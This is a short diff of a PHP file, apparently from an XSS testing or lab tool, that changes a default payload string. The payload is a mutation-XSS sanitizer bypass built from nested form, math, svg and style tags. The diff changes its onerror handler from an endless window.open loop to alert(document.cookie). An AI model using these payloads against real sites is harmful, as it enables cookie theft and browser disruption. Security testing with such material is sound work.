@@ -130,7 +130,7 @@ if(isset($_POST['payload_submit'])){
             $payload = $bypass1 . $_POST['xss_payload']. $bypass2;
         }
         else{
-            $payload='<p><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=\'while(true){window.open("https://www.google.com")}\' src>">';
+            $payload='<p><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=\'alert(document.cookie)\' src>">';
     
         }
     }
